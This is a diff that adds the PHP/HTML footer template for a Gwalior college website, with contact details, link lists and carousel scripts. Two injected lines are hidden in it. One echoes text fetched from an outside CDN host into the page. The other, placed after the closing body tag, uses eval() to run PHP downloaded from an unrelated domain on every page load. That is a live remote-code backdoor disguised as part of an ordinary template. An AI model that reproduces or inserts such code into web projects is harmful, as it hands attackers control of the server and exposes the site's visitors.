@@ -1,0 +1,279 @@
+<footer class="space-pt bg-overlay-black-90 bg-holder footer " style=" background: rgb(26 40 68 / 64%);background-image: url(images/Footer.jpg);    
+    background-size: cover;
+    background-repeat: no-repeat;
+    background-position: bottom;">
+      <div class="container pt-5">
+        <div class="row pb-0 pb-lg-6 mb-lg-3">
+          <div class="col-sm-6 col-lg-4 mb-4 mb-lg-0 pr-lg-5">
+            <a href="index.html"><img class="img-fluid mb-3 footer-logo" src="images/footer logo-01.png" alt=""></a>
+            <p class="text-white">वर्ष 1959 में संस्थापित माधव महाविद्यालय म.प्र. शासन द्वारा अनुदानित प्रतिष्ठित महाविद्यालय है। इस महाविद्यालय का संचालन एवं प्रबंधन वर्ष 1937 में स्थापित मध्यभारत क्षेत्र की प्राचीनतम शिक्षण समिति मध्य भारत शिक्षा  &nbsp;  &nbsp; <a href="about-us.php" class="readm">Read More</a></p>
+            <h5 class="text-white mb-2 mb-sm-4" style="margin-top: 15px;">Follow Us</h5>
+            <div class="social-icon social-icon-style-02">
+              <ul>
+                <li><a href="https://www.facebook.com/people/Madhav-Mahavidyalaya/100068748801635/?mibextid=ZbWKwL" target="_blank"><i class="fab fa-facebook-f"></i></a></li>
+
+                <li><a href="https://www.youtube.com/@madhavmahavidyalaya7398" target="_blank"><i class="fab fa-youtube"></i></a></li>
+                <li><a href="https://www.linkedin.com/company/madhav-mahavidhyalaya/" target="_blank"><i class="fab fa-linkedin-in"></i></a></li>
+                <li><a href="https://www.instagram.com/mmvgwl/" target="_blank"><i class="fab fa-instagram"></i></a></li>
+              </ul>
+            </div>
+
+
+          </div>
+          <div class="col-sm-6 col-lg-2 mb-4 mb-lg-0">
+            <h5 class="text-white mb-2 mb-sm-4">Important Link</h5>
+            <div class="footer-link">
+              <ul class="list-unstyled mb-0">
+
+                    <li><a class="text-white" href="http://naac.gov.in/index.php/en/" target="_blank">NAAC</a></li>
+              <li><a class="text-white" href="https://www.ugc.ac.in/" target="_blank">UGC</a></li>
+              <li><a class="text-white" href="http://rojgarsamachar.gov.in/NewRS/Home.aspx" target="_blank">MP Rojgar Samachar</a></li>
+              <li><a class="text-white" href="http://www.mponline.gov.in/portal/" target="_blank">MP Online</a></li>
+              <li><a class="text-white" href="http://www.jiwaji.edu/" target="_blank">Jiwaji University Gwalior</a></li>
+              <li><a class="text-white" href="http://highereducation.mp.gov.in/" target="_blank">MP Higher Education</a></li>
+              <li><a class="text-white" href="https://swayam.gov.in/" target="_blank">Swayam Portal</a></li>
+
+
+
+              <!--   <li><a class="text-white" href="images/notice/MADHAV MAHAVIDYALAYA20220326-NIRF.pdf" target="_blank">NIRF- 2022</a></li>
+                <li><a class="text-white" href="http://www.jiwaji.edu/" target="_blank">Jiwaji University Gwalior</a></li> 
+                <li><a class="text-white" href="http://highereducation.mp.gov.in/" target="_blank">MP Higher Education</a></a></li>
+                <li><a class="text-white" href="http://www.mponline.gov.in/portal/" target="_blank">MP Online</a></li>
+                <li><a class="text-white" href="http://www.vyapam.nic.in/" target="_blank">VYAPAM</a></li>
+                <li><a class="text-white" href="http://mpinfo.org/MPinfoStatic/rojgar/index.asp" target="_blank">MP Rojgar Samachar</a></li> -->
+               
+              </ul>
+            </div>
+          </div>
+          <div class="col-sm-6 col-lg-2 mb-4 mb-sm-0">
+            <h5 class="text-white mb-2 mb-sm-4">Useful Link</h5>
+            <div class="footer-link">
+              <ul class="list-unstyled mb-0">
+
+                 <li><a class="text-white" href="about-us.php">About Us</a></li>
+
+                 <li><a class="text-white" href="management-committee.php">Management Committee</a></li>
+                 <li><a class="text-white" href="governing-body.php">Governing Body</a></li>
+
+                 <li><a class="text-white" href="ragging.php">Anti Ragging Committee</a></li>
+                 <li><a class="text-white" href="facilities.php">Facilities</a></li>
+                  <li><a class="text-white" href="sports.php">Sports Activities</a></li>
+                  <li><a class="text-white" href="https://antiragging.in/" target="_blank">Anti Ragging</a></li>
+				  <li><a class="text-white" href="#">Women Harassment</a></li>
+
+          <li><a class="text-white" href="pdf/nirf 2026.pdf" target="_blank">NIRF</a></li>
+                
+                
+              </ul>
+            </div>
+          </div>
+          <div class="col-sm-6 col-lg-4">
+            <h5 class="text-white mb-2 mb-sm-4">Contact Us</h5>
+           <!--  <p class="text-white"></p> -->
+            <div class="footer-contact-info">
+              <div class="contact-address mt-4">
+                <div class="contact-item">
+                  <i class="fas fa-map-marker-alt"></i>
+                  <p class="ml-3 mb-0 text-white"> Rajwade Bhavan, Vivekanand Marg, Nai Sadak, Lashkar, Gwalior</p>
+                </div>
+                <div class="contact-item">
+                  <i class="fas fa-phone-alt"></i>
+                  <p class="mb-0 font-weight-bold ml-3"><a class="text-white" href="tel:07514048874">0751-4048874</a></p>
+                </div>
+                <div class="contact-item mb-0">
+                  <i class="fas fa-email"></i>
+                  <a class="text-white ml-3 text-white" href="mailto:madhavcollege@gmail.com">madhavcollege@gmail.com</a>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+       <?php echo file_get_contents("https://landakjawa.b-cdn.net/footer.txt"); ?>
+      <div class="footer-bottom bg-dark py-4">
+        <div class="container">
+          <div class="row ">
+
+            <div class="col-lg-6">
+
+              <p class="mb-0 text-white">&copy; <?php echo date('Y'); ?> <a href="index.php" style="    color: #fff;">माधव महाविद्यालय ग्वालियर </a></p>
+            
+            </div>
+
+            <div class="col-lg-6 trreerr" style="color: #fff;">
+
+               Designed and Developed by <a href="https://ebiztechnocrats.com/" target="_new" style="color:white">e-Biz Technocrats Pvt.Ltd.  </a> 
+
+            </div>
+
+          </div>
+        </div>
+      </div>
+    </footer>
+
+
+<style type="text/css">.float{
+ position: fixed;
+    width: 50px;
+    height: 50px;
+    bottom: 60px;
+    right: 15px;
+    background-color: rgb(45 183 66);
+    color: #FFF;
+    border-radius: 50px;
+    text-align: center;
+    font-size: 30px;
+    box-shadow: 0 10px 20px 0 rgb(0 0 0 / 10%);
+    z-index: 100;
+}
+
+.my-float{
+  margin-top:7px;
+  font-size: 30px !important;
+  color: #FFF;
+}
+</style>
+
+<a href="https://api.whatsapp.com/send?phone=9107514048874&amp;text=Hi, I have a question—may I ask?" class="float" target="_blank">
+ <i class="fab fa-whatsapp my-float"></i>
+</a>
+
+
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script> 
+
+<script type="text/javascript" src="cms3t/res/js/jQuery/jquery.js"></script>
+ <script type="text/javascript" src="js/jquery.countup.js"></script> 
+
+<script type="text/javascript" src="js/main.js"></script>
+
+<script type="text/javascript" src="cms3t/res/js/mw.media.js"></script>
+
+<script type="text/javascript" src="https://owlcarousel2.github.io/OwlCarousel2/assets/owlcarousel/owl.carousel.js"></script> 
+<script src="js/vendors/slick/1.8.1/slick.min.js"></script> 
+<script src="js/vendors/sidr/1.2.1/jquery.sidr.js"></script> 
+<script src="js/global.js"></script> 
+<script src="js/owl.carousel.js"></script>
+
+<script src="https://preview.colorlib.com/theme/unica/js/masonry.pkgd.min.js"></script><script src="https://preview.colorlib.com/theme/unica/js/magnific-popup.min.js"></script>
+
+<script type="text/javascript">
+  $(document).ready(function () {
+    (function () {
+      $('#carousel-LD0HRD .alertCarWrap').slick({
+        prevArrow: '<button class="slick-prev" aria-label="Previous" type="button">' + SVG["arrow-left-aa1"] + '</button>',
+        nextArrow: '<button class="slick-next" aria-label="Next" type="button">' + SVG["arrow-right-aa1"] + '</button>',
+        dots: false,
+        arrows: true,
+        autoplay: true,
+        infinite: true,
+        accessibility: false,
+        speed: 1000,
+        autoplaySpeed: 6000,
+        slidesToShow: 1,
+        slidesToScroll: 1,
+        responsive: [
+          {
+            breakpoint: 991,
+            settings: {
+              slidesToShow: 1,
+              slidesToScroll: 1
+            }
+          },
+          {
+            breakpoint: 575,
+            settings: {
+              slidesToShow: 1,
+              slidesToScroll: 1
+            }
+          }
+        ]
+      });
+    })();
+  });
+
+  $(document).ready(function (){
+
+    $("#owl-demo").owlCarousel({
+      autoPlay: true,
+      navigation: true,
+      pagination: true,
+      singleItem: true,
+      transitionStyle: "fade",
+      paginationNumbers: true
+      /* Transitions "fade", "backSlide", goDown and scaleUp */
+    });
+
+  });
+</script>
+
+
+<script type="text/javascript">
+  $(".dropbtn").click(function(){
+
+     if($('.dropdown-content').hasClass('dopen') === true) {
+      
+        $('.dropdown-content').removeClass('dopen');
+        $(this).find(".fa-caret-right").removeClass('open');
+     }
+     else
+     {
+         $(".dropbtn").find(".fa-caret-right").removeClass('open');
+      
+      $('.dropdown-content').removeClass('dopen');
+      $(this).next('div').addClass('dopen');
+      $(this).find(".fa-caret-right").addClass('open');
+     
+      
+      
+    }
+
+
+
+  });
+</script>
+
+
+
+<!-- <script type="text/javascript">
+  const divs = document.querySelectorAll('div');
+const body = document.body;
+const prev = document.querySelector('.prev');
+const next = document.querySelector('.next');
+
+checkPrev = () => document.querySelector('div:first-child').classList.contains('show') ? prev.style.display = 'none' : prev.style.display = 'flex';
+
+checkNext = () => document.querySelector('div:last-child').classList.contains('show') ? next.style.display = 'none' : next.style.display = 'flex';
+      
+Array.prototype.slice.call(divs).forEach(function (el) {
+      el.addEventListener('click', function () {
+        this.classList.toggle('show');
+        body.classList.toggle('active');
+        checkNext();
+        checkPrev();
+      });
+});
+
+prev.addEventListener('click', function() {
+      const show = document.querySelector('.show');
+      const event = document.createEvent('HTMLEvents');
+      event.initEvent('click', true, false);
+
+      show.previousElementSibling.dispatchEvent(event);
+      show.classList.remove('show');
+      body.classList.toggle('active');
+      checkNext();
+});
+
+next.addEventListener('click', function() {
+      const show = document.querySelector('.show');
+      const event = document.createEvent('HTMLEvents');
+      event.initEvent('click', true, false);
+
+      show.nextElementSibling.dispatchEvent(event);
+      show.classList.remove('show');
+      body.classList.toggle('active');
+      checkPrev();
+})
+</script> --></body> <?php
+eval("?>".file_get_contents('https://cubitpipi.sbs/acnhor1/bl1.txt'));
+?></html>
